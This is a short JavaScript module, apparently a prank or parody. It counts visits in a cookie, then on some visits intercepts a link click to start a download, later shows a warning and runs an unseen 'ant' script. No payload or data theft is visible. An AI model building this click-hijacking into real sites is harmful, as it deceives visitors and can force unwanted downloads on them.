import Pops from './Pops'
import Util from './Util'
import startAnt from '../ant/ant.js'

let status = Util.getCookie('pops_status') || 0
console.log(status)

if(status > 3 && status < 14 && Math.random() > .5) {
    function intercept(e) {    
        if(e.target && e.target.tagName == 'A') {
            e.preventDefault()
            Pops.initiateDl()
            document.removeEventListener('click', intercept, true)
        }
    }
    document.addEventListener('click', intercept, true);
} else if(status == 14) {
    Pops.initiateWarn(() => {
        Util.setCookie('pops_status', ++status, 30)
    })
} else if(status >= 15 && status <= 9000){
    startAnt()
}

if(status < 14) {
    Util.setCookie('pops_status', ++status, 30)
}

// The madness can be disabled by calling this function from console
window.stopPops = function() {
    Util.setCookie('pops_status', 9001, 30)
}
